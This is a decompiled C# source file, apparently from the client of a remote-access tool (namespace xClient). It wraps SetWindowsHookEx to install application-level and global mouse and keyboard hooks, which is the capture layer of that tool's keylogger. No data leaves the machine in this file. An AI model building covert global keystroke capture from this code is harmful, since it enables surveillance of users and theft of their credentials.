using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using xClient.Core.MouseKeyHook.Implementation;

namespace xClient.Core.MouseKeyHook.WinApi
{
	// Token: 0x02000071 RID: 113
	internal static class HookHelper
	{
		// Token: 0x06000312 RID: 786 RVA: 0x00003793 File Offset: 0x00001993
		public static HookResult HookAppMouse(Callback callback)
		{
			return HookHelper.HookApp(7, callback);
		}

		// Token: 0x06000313 RID: 787 RVA: 0x0000379C File Offset: 0x0000199C
		public static HookResult HookAppKeyboard(Callback callback)
		{
			return HookHelper.HookApp(2, callback);
		}

		// Token: 0x06000314 RID: 788 RVA: 0x000037A5 File Offset: 0x000019A5
		public static HookResult HookGlobalMouse(Callback callback)
		{
			return HookHelper.HookGlobal(14, callback);
		}

		// Token: 0x06000315 RID: 789 RVA: 0x000037AF File Offset: 0x000019AF
		public static HookResult HookGlobalKeyboard(Callback callback)
		{
			return HookHelper.HookGlobal(13, callback);
		}

		// Token: 0x06000316 RID: 790 RVA: 0x0000F3EC File Offset: 0x0000D5EC
		private static HookResult HookApp(int hookId, Callback callback)
		{
			HookProcedure hookProcedure = (int code, IntPtr param, IntPtr lParam) => HookHelper.HookProcedure(code, param, lParam, callback);
			HookProcedureHandle hookProcedureHandle = HookNativeMethods.SetWindowsHookEx(hookId, hookProcedure, IntPtr.Zero, ThreadNativeMethods.GetCurrentThreadId());
			if (hookProcedureHandle.IsInvalid)
			{
				HookHelper.ThrowLastUnmanagedErrorAsException();
			}
			return new HookResult(hookProcedureHandle, hookProcedure);
		}

		// Token: 0x06000317 RID: 791 RVA: 0x0000F43C File Offset: 0x0000D63C
		private static HookResult HookGlobal(int hookId, Callback callback)
		{
			HookProcedure hookProcedure = (int code, IntPtr param, IntPtr lParam) => HookHelper.HookProcedure(code, param, lParam, callback);
			HookProcedureHandle hookProcedureHandle = HookNativeMethods.SetWindowsHookEx(hookId, hookProcedure, Process.GetCurrentProcess().MainModule.BaseAddress, 0);
			if (hookProcedureHandle.IsInvalid)
			{
				HookHelper.ThrowLastUnmanagedErrorAsException();
			}
			return new HookResult(hookProcedureHandle, hookProcedure);
		}

		// Token: 0x06000318 RID: 792 RVA: 0x0000F490 File Offset: 0x0000D690
		private static IntPtr HookProcedure(int nCode, IntPtr wParam, IntPtr lParam, Callback callback)
		{
			if (nCode != 0)
			{
				return HookHelper.CallNextHookEx(nCode, wParam, lParam);
			}
			CallbackData data = new CallbackData(wParam, lParam);
			if (!callback(data))
			{
				return new IntPtr(-1);
			}
			return HookHelper.CallNextHookEx(nCode, wParam, lParam);
		}

		// Token: 0x06000319 RID: 793 RVA: 0x000037B9 File Offset: 0x000019B9
		private static IntPtr CallNextHookEx(int nCode, IntPtr wParam, IntPtr lParam)
		{
			return HookNativeMethods.CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
		}

		// Token: 0x0600031A RID: 794 RVA: 0x0000F4D0 File Offset: 0x0000D6D0
		private static void ThrowLastUnmanagedErrorAsException()
		{
			int lastWin32Error = Marshal.GetLastWin32Error();
			throw new Win32Exception(lastWin32Error);
		}
	}
}
